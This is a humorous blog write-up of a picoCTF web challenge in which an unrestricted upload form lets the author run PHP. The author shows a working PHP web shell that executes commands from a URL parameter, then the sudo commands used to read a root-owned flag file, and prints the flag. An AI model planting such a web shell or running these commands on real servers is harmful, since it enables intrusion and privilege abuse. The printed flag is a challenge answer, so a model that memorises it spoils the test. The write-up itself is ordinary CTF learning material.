---
title: 'PicoCTF Writeup #482'
date: 2025-08-20T10:06:40+07:00
draft: false
description: ''
tags: ['ctf']
---


## Hacking Profile Pictures Like It’s 2005 (picoCTF Web Exploit Writeup)

So, I tried another picoCTF challenge and this one was basically:

👨‍💻 *“A developer added profile picture uploads. What could possibly go wrong?”*

If you’ve ever touched PHP (I’m sorry) you already know the answer: **literally everything**.

The challenge: [Standard Pizzas](https://play.picoctf.org/practice/challenge/482) 🍕



## Upload Feature? More Like Upload *Malware*

The site lets you upload an image and then proudly tells you where it lives:

```
The file duck.jpeg has been uploaded 
Path: uploads/duck.jpeg
```

As soon as I saw that, my brain went:

👉 “Wait… you’re telling me I can upload **any file** and then run it directly?”

This is basically the cybersecurity equivalent of putting the house keys under the doormat.



## Congratulations, You Played Yourself

So I uploaded this masterpiece called `script.php`:

```php
<?php
$result = shell_exec("pwd");
echo $result;
?>
```

Then I visited `/uploads/script.php` and the site politely told me:

```
/var/www/html/uploads
```

💥 RCE achieved. PHP once again proving it’s not a bug, it’s a lifestyle.



## PHP Webshell as a Service™

One command was cute, but I wanted **full control**.
So I made a tiny upgrade:

```php
<?php
$command = $_GET["c"];
echo shell_exec($command);
?>
```

Now I could just run commands directly in the URL:

```
/uploads/script.php?c=ls
```

At this point I felt like a 90s movie hacker typing “access mainframe” — except it actually worked.



## Dear Root, I’m in Your Walls

The challenge said the flag was hiding in `/root`.
No problem. Let’s snoop:

```
/uploads/script.php?c=sudo -l
```

Server: “Yeah, you can sudo.”
Me: “Say no more.”

```
/uploads/script.php?c=sudo ls /root
```

Output:

```
flag.txt
```

Time for the final payload:

```
/uploads/script.php?c=sudo cat /root/flag.txt
```

And there it was:

```
picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}
```



## PHP + Uploads = Chaos.exe

What did we learn, kids?

* If you let users upload arbitrary files and run them, you’ve basically created **free hacker hosting**.
* File extensions are lies. Never trust them.
* PHP with `shell_exec` is like giving a toddler a flamethrower.
* This challenge was basically an *Any% speedrun exploit*.



## Final Thoughts

This challenge was a nostalgia trip — straight back to the early 2000s when every site was PHP, every upload folder was writable, and every script kiddie had an edgy handle like “xXhaxor69Xx”.

So yeah. Don’t let “profile pictures” execute shell commands. Unless you want hackers to order root access with their pizza. 🍕💻



> Flag: **picoCTF{wh47\_c4n\_u\_d0\_wPHP\_a4ca6ea0}**

